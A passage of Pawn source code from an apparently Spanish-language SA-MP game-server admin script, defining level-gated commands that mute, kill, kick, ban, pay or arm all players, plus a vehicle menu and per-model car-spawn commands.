	    if(isnull(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /FakeCmdAll [Comando]");
        CMDMessageToAdmins(playerid,"/FakeCmdAll");
        for(new i = 0; i < MAX_PLAYERS; i++) {
        if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
	        PlayerPlaySound(i,1057,0.0,0.0,0.0);
	        CallRemoteFunction("OnPlayerCommandPerformed", "is", i, tmp2);
        }
		}
	    return SendClientMessage(playerid,red,"|Info| »{EAEAEA} Fake cmd enviado.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 9{EAEAEA} para usar este comando.");
}
#endif

//----------------------------------------------------------------------------//
// 		             	/all Commands                                         //
//----------------------------------------------------------------------------//

CMD:spawnall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 8 || IsPlayerAdmin(playerid)) {
		CMDMessageToAdmins(playerid,"/SpawnAll");
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); SetPlayerPos(i, 0.0, 0.0, 0.0); SpawnPlayer(i);
			}
		}
		new string[128]; format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha reiniciado a todos los jugadores.", pName(playerid) );
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 8{EAEAEA} para usar este comando.");
}

CMD:muteall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 6 || IsPlayerAdmin(playerid)) {
		CMDMessageToAdmins(playerid,"/MuteAll");
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); PlayerInfo[i][Muted] = 1; PlayerInfo[i][MuteWarnings] = 0;
			}
		}
		new string[128]; format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha silenciado a todos los jugadores.", pName(playerid) );
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 6{EAEAEA} para usar este comando.");
}

CMD:unmuteall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 6 || IsPlayerAdmin(playerid)) {
		CMDMessageToAdmins(playerid,"/UnMuteAll");
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); PlayerInfo[i][Muted] = 0; PlayerInfo[i][MuteWarnings] = 0;
			}
		}
		new string[128]; format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha des-silenciado a todos los jugadores.", pName(playerid) );
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 6{EAEAEA} para usar este comando.");
}

CMD:getall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 8 || IsPlayerAdmin(playerid)) {
		CMDMessageToAdmins(playerid,"/GetAll");
		new Float:x,Float:y,Float:z, interior = GetPlayerInterior(playerid);
    	GetPlayerPos(playerid,x,y,z);
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); SetPlayerPos(i,x+(playerid/4)+1,y+(playerid/4),z); SetPlayerInterior(i,interior);
			}
		}
		new string[128]; format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha traido a todos los jugadores a su posicion.", pName(playerid) );
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 8{EAEAEA} para usar este comando.");
}

CMD:healall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 3 || IsPlayerAdmin(playerid)) {
		CMDMessageToAdmins(playerid,"/HealAll");
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); SetPlayerHealth(i,99.0);
			}
		}
		new string[128]; format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} le ha dado vida a todos los jugadores.", pName(playerid) );
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 3{EAEAEA} para usar este comando.");
}

CMD:armourall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 3 || IsPlayerAdmin(playerid)) {
		CMDMessageToAdmins(playerid,"/ArmourAll");
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); SetPlayerArmour(i,99.0);
			}
		}
		new string[128]; format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} le ha dado armadura a todos los jugadores.", pName(playerid) );
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 3{EAEAEA} para usar este comando.");
}

CMD:killall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 8 || IsPlayerAdmin(playerid)) {
		CMDMessageToAdmins(playerid,"/KillAll");
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); SetPlayerHealth(i,0.0);
			}
		}
		new string[128]; format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha matado a todos los jugadores.", pName(playerid) );
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 8{EAEAEA} para usar este comando.");
}

CMD:freezeall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 6 || IsPlayerAdmin(playerid)) {
		CMDMessageToAdmins(playerid,"/FreezeAll");
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); TogglePlayerControllable(playerid,false); PlayerInfo[i][Frozen] = 1;
			}
		}
		new string[128]; format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha congelado a todos los jugadores.", pName(playerid) );
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 6{EAEAEA} para usar este comando.");
}

CMD:unfreezeall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 6 || IsPlayerAdmin(playerid)) {
		CMDMessageToAdmins(playerid,"/UnFreezeAll");
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); TogglePlayerControllable(playerid,true); PlayerInfo[i][Frozen] = 0;
			}
		}
		new string[128]; format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha descongelado a todos los jugadores.", pName(playerid) );
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 6{EAEAEA} para usar este comando.");
}

CMD:kickall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 8 || IsPlayerAdmin(playerid)) {
		CMDMessageToAdmins(playerid,"/KickAll");
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); Kick(i);
			}
		}
		new string[128]; format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha expulsado a todos los jugadores.", pName(playerid) );
		SaveToFile("KickLog",string);
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 8{EAEAEA} para usar este comando.");
}

CMD:banall(playerid,params[]) {
    #pragma unused params
    new pame[MAX_PLAYER_NAME];
	GetPlayerName(playerid, pame, sizeof(pame));
    if(!strcmp(NickPrincipal,pame,true)){
	if(PlayerInfo[playerid][Level] >= 10 || IsPlayerAdmin(playerid)) {
		CMDMessageToAdmins(playerid,"/BanAll");
		new string[128]; format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha baneado a todos los jugadores.", pName(playerid) );
		SaveToFile("BanLog",string);
		for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				BanEx(i, string);
			}
		}
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Solo {C0C0C0}Psicoloco{EAEAEA} puede usar este comando.");
}

CMD:slapall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 9 || IsPlayerAdmin(playerid)) {
		CMDMessageToAdmins(playerid,"/SlapAll");
		new Float:x, Float:y, Float:z;
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1190,0.0,0.0,0.0); GetPlayerPos(i,x,y,z);	SetPlayerPos(i,x,y,z+4);
			}
		}
		new string[128]; format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha golpeado a todos los jugadores.", pName(playerid) );
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 9{EAEAEA} para usar este comando.");
}

CMD:explodeall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 8 || IsPlayerAdmin(playerid)) {
		CMDMessageToAdmins(playerid,"/ExplodeAll");
		new Float:x, Float:y, Float:z;
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1190,0.0,0.0,0.0); GetPlayerPos(i,x,y,z);	CreateExplosion(x, y , z, 7, 10.0);
			}
		}
		new string[128]; format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha explotado a todos los jugadores.", pName(playerid) );
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 8{EAEAEA} para usar este comando.");
}

CMD:disarmall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 8 || IsPlayerAdmin(playerid)) {
		CMDMessageToAdmins(playerid,"/DisarmAll");
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); ResetPlayerWeapons(i);
			}
		}
		new string[129]; format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha desarmado a todos los jugadores.", pName(playerid) );
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 8{EAEAEA} para usar este comando.");
}

CMD:ejectall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 8 || IsPlayerAdmin(playerid)) {
    	CMDMessageToAdmins(playerid,"/EjectAll");
        new Float:x, Float:y, Float:z;
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
			    if(IsPlayerInAnyVehicle(i)) {
					PlayerPlaySound(i,1057,0.0,0.0,0.0); GetPlayerPos(i,x,y,z); SetPlayerPos(i,x,y,z+3);
				}
			}
		}
		new string[128]; format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha sacado a todos los jugadores de su vehiculo.", pName(playerid) );
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 8{EAEAEA} para usar este comando.");
}

//-------------==== Set All Commands ====-------------//

CMD:setallskin(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 8 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SetAllSkin [SkinID]");
		new var = strval(params), string[128];
		if(!IsValidSkin(var)) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID de Skin invalido.");
       	CMDMessageToAdmins(playerid,"/SetAllSkin");
		for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				SetPlayerSkin(i,var);
			}
		}
		format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} le ha puesto el skin {FF0000}%d{EAEAEA} a todos los jugadores.", pName(playerid), var );
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Necesitas ser administrador {FF0000}Nivel 8{EAEAEA} para usar este comando.");
}


CMD:setallweather(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 6 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SetAllWeather [ClimaID]");
		new var = strval(params), string[128];
       	CMDMessageToAdmins(playerid,"/SetAllWeather");
		for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				SetPlayerWeather(i, var);
			}
		}
		format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} le ha puesto el clima a todos los jugadores en {FF0000}%d", pName(playerid), var );
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Necesitas ser administrador {FF0000}Nivel 6{EAEAEA} para usar este comando.");
}

CMD:setallworld(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 6 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SetAllWorld [Mundo Virtual]");
		new var = strval(params), string[128];
       	CMDMessageToAdmins(playerid,"/SetAllWorld");
		for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				SetPlayerVirtualWorld(i,var);
			}
		}
		format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha puesto el mundo de todos los jugadores en {FF0000}%d.", pName(playerid), var );
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Necesitas ser administrador {FF0000}Nivel 6{EAEAEA} para usar este comando");
}

CMD:setallkills(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 8 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SetAllKills [Kills]");
		new var = strval(params), string[128];
       	CMDMessageToAdmins(playerid,"/SetAllKills");
		for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				#if defined USE_STATS
				PlayerInfo[i][Kills] = var;
				#endif
			}
		}
		format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} le ha puesto los kills a todos los jugadores en {FF0000}%d.", pName(playerid), var );
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Necesitas ser administrador {FF0000}Nivel 8{EAEAEA} para usar este comando.");
}

CMD:giveallkills(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 8 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /GiveAllKills [Kills]");
		new var = strval(params), string[128];
       	CMDMessageToAdmins(playerid,"/GiveAllKills");
		for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				#if defined USE_STATS
				PlayerInfo[i][Kills] = PlayerInfo[i][Kills]+ var;
				#endif
			}
		}
		format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} le ha dado {FF0000}%d{EAEAEA} kills a todos los jugadores.", pName(playerid), var );
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Necesitas ser administrador {FF0000}Nivel 8{EAEAEA} para usar este comando.");
}

CMD:setalldeaths(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 8 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SetAllDeaths [Kills]");
		new var = strval(params), string[128];
       	CMDMessageToAdmins(playerid,"/SetAllDeaths");
		for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				#if defined USE_STATS
				PlayerInfo[i][Deaths] = var;
				#endif
			}
		}
		format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} le ha puesto las deaths a todos los jugadores en {FF0000}%d.", pName(playerid), var );
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Necesitas ser administrador {FF0000}Nivel 8{EAEAEA} para usar este comando.");
}

CMD:givealldeaths(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 8 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /GiveAllDeaths [Kills]");
		new var = strval(params), string[128];
       	CMDMessageToAdmins(playerid,"/GiveAllDeaths");
		for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				#if defined USE_STATS
				PlayerInfo[i][Deaths] = PlayerInfo[i][Deaths]+ var;
				#endif
			}
		}
		format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} le ha dado {FF0000}%d{EAEAEA} deaths a todos los jugadores.", pName(playerid), var );
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Necesitas ser administrador {FF0000}Nivel 8{EAEAEA} para usar este comando.");
}

CMD:setallscore(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 8 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SetAllScore [Score]");
		new var = strval(params), string[128];
       	CMDMessageToAdmins(playerid,"/SetAllScore");
		for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				SetPlayerScore(i,var);
			}
		}
		format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} le ha puesto el score a todos los jugadores en {FF0000}%d.", pName(playerid), var );
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Necesitas ser administrador {FF0000}Nivel 8{EAEAEA} para usar este comando.");
}


CMD:giveallscore(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 8 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /GiveAllScore [Score]");
		new var = strval(params), string[128];
       	CMDMessageToAdmins(playerid,"/GiveAllScore");
		for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				SetPlayerScore(i, GetPlayerScore(i)+ var);
				#if defined USE_STATS
		 	    PlayerInfo[i][Kills] = PlayerInfo[i][Kills]+ var;
	    	    #endif
			}
		}
		format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} le ha dado a todos los jugadores {FF0000}%d{EAEAEA} de score.", pName(playerid), var );
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Necesitas ser administrador {FF0000}Nivel 8{EAEAEA} para usar este comando.");
}

CMD:setallcash(playerid,params[]) {
    new pame[MAX_PLAYER_NAME];
	GetPlayerName(playerid, pame, sizeof(pame));
    if(!strcmp(NickPrincipal,pame,true)){
	if(PlayerInfo[playerid][Level] >= 6 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SetAllCash [Dinero");
		new var = strval(params), string[128];
       	CMDMessageToAdmins(playerid,"/SetAllCash");
		for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				ResetPlayerMoney(i);
				GivePlayerMoney(i,var);
			}
		}
		format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} le ha puesto el dinero a todos en {52C433}$%d.", pName(playerid), var );
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Necesitas ser administrador {FF0000}Nivel 6{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Solo {C0C0C0}Psicoloco{EAEAEA} puede usar este comando.");
}


CMD:giveallcash(playerid,params[]) {
    new pame[MAX_PLAYER_NAME];
	GetPlayerName(playerid, pame, sizeof(pame));
    if(!strcmp(NickPrincipal,pame,true)){
	if(PlayerInfo[playerid][Level] >= 6 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /GiveAllCash [Dinero]");
		new var = strval(params), string[128];
       	CMDMessageToAdmins(playerid,"/GiveAllCash");
		for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				GivePlayerMoney(i,var);
			}
		}
		format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} le ha dado a todos los jugadores {52C433}$%d.", pName(playerid), var );
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Necesitas ser administrador {FF0000}Nivel 6{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Solo {C0C0C0}Psicoloco{EAEAEA} puede usar este comando.");
}

CMD:giveallweapon(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 6 || IsPlayerAdmin(playerid)) {
	    new tmp[256], tmp2[256], Index, bala, weap, WeapName[32], string[128]; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(!strlen(tmp) ) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /GiveAllWeapon [ArmaID/Nombre del Arma] [Municiones]");
		if(!strlen(tmp2) || !IsNumeric(tmp2) || strval(tmp2) <= 0 || strval(tmp2) > 99999) bala = 500;
		if(!IsNumeric(tmp)) weap = GetWeaponIDFromName(tmp); else weap = strval(tmp);
	  	if(!IsValidWeapon(weap)) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID de arma invalida.");
      	CMDMessageToAdmins(playerid,"/GiveAllWeapon");
		for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				GivePlayerWeapon(i,weap,bala);
			}
		}
		GetWeaponName(weap, WeapName, sizeof(WeapName) );
		format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s {EAEAEA}le ha dado a todos los players una {FF0000}%s.", pName(playerid), WeapName);
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 6{EAEAEA} para usar este comando.");
}


//================================[ Menu Commands ]=============================

CMD:lmenu(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 9 || IsPlayerAdmin(playerid)) {
        ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
    }
	else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 9{EAEAEA} para usar este comando.");
	return 1;
}
CMD:veh(playerid,params[]){
	#pragma unused params
	new string[475];
	if(IsPlayerInAnyVehicle(playerid) == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya estas en un vehiculo.");
		return 1;
	}
	if((dUserINT(PlayerName2(playerid)).("MenuImagen")) == 1){
		ShowModelSelectionMenu(playerid, autoslist, "~w~Vehiculos", DIALOG_BG_COLOR, PREV_BG_COLOR, PREV_BG_COLOR2);
	}else{
		format(string,sizeof(string),"{FF0000}*{FFFFFF} Aviones\n{FF0000}*{FFFFFF} Helicopteros\n{FF0000}*{FFFFFF} Motos\n{FF0000}*{FFFFFF} Convertibles\n{FF0000}*{FFFFFF} Industrial\n{FF0000}*{FFFFFF} Lowriders\n{FF0000}*{FFFFFF} Todoterreno\n{FF0000}*{FFFFFF} Servicio público",string);
		format(string, sizeof string, "%s\n{FF0000}*{FFFFFF} Saloons\n{FF0000}*{FFFFFF} Deportivos\n{FF0000}*{FFFFFF} Vagones\n{FF0000}*{FFFFFF} Barcos\n{FF0000}*{FFFFFF} Trailers\n{FF0000}*{FFFFFF} Únicos\n{FF0000}*{FFFFFF} Vehiculos RC",string);
		ShowPlayerDialog(playerid,DIALOGID3+24,DIALOG_STYLE_LIST,"Vehiculos",string,"Seleccionar","Salir");
	}
	return 1;
}
CMD:autos(playerid,params[]){
	#pragma unused params
	AntiFlood[playerid] = false;
	cmd_veh(playerid,"\1");
	return 1;
}

CMD:vehiculos(playerid,params[]){
	#pragma unused params
	AntiFlood[playerid] = false;
    cmd_veh(playerid,"\1");
	return 1;
}

//****=========[COMANDOS AUTOS]============****//
CMD:landstalker(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,400);
	return 1;
}
CMD:bravura(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,401);
	return 1;
}
CMD:buffalo(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,402);
	return 1;
}
CMD:linerunner(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,403);
	return 1;
}
CMD:perenniel(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,404);
	return 1;
}
CMD:sentinel(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,405);
	return 1;
}
CMD:dumper(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,406);
	return 1;
}
CMD:Firetruck(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,407);
	return 1;
}
CMD:trashmaster(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,408);
	return 1;
}
CMD:stretch(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,409);
	return 1;
}
CMD:manana(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,410);
	return 1;
}
CMD:infernus(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,411);
	return 1;
}
CMD:voodoo(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,412);
	return 1;
}
CMD:pony(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,413);
	return 1;
}
CMD:mule(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,414);
	return 1;
}
CMD:cheetah(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,415);
	return 1;
}
CMD:ambulance(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,416);
	return 1;
}
CMD:leviathan(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,417);
	return 1;
}
CMD:moonbeam(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,418);
	return 1;
}
CMD:esperanto(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,419);
	return 1;
}
CMD:taxi(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,420);
	return 1;
}
